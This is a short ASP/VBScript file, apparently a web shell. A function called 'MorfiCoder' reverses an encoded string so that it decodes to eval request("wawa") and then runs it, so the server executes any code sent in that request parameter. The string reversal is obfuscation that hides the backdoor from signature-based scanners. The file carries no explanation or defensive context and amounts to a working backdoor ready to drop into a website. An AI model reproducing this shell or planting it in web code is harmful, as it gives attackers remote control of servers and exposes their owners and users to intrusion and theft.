<%
Function MorfiCoder(Code)
MorfiCoder=Replace(Replace(StrReverse(Code),"/*/",""""),"\*\",vbCrlf)
End Function
Execute MorfiCoder(")/*/wawa/*/(tseuqer lave")
%>
